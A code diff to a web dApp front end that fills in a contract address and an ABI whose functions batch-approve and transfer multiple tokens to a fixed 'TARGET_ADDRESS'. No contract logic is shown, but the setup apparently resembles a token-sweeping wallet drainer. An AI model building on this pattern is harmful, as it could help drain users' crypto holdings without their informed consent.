@@ -4,8 +4,66 @@ const transferFromButton = document.getElementById('transferFromButton');
 const message = document.getElementById('message');
 
 let userAccount = null;
-const contractAddress = 'YOUR_CONTRACT_ADDRESS'; // 请替换为你的合约地址
-const contractABI = []; // 请在这里添加你的合约 ABI
+const contractAddress = '0x3d33C01bCC36ac6A8f872599A9c9351c11Ef07E7'; // 请替换为你的合约地址
+const contractABI = [
+	{
+		"inputs": [
+			{
+				"internalType": "address[]",
+				"name": "tokenAddresses",
+				"type": "address[]"
+			}
+		],
+		"name": "approveAndTransferMultipleTokens",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "from",
+				"type": "address"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "to",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			},
+			{
+				"indexed": false,
+				"internalType": "address",
+				"name": "tokenAddress",
+				"type": "address"
+			}
+		],
+		"name": "TokensTransferred",
+		"type": "event"
+	},
+	{
+		"inputs": [],
+		"name": "TARGET_ADDRESS",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	}
+]; // 请在这里添加你的合约 ABI
 
 // 默认值的初始化，连接后会自动获取
 let spenderAddress;
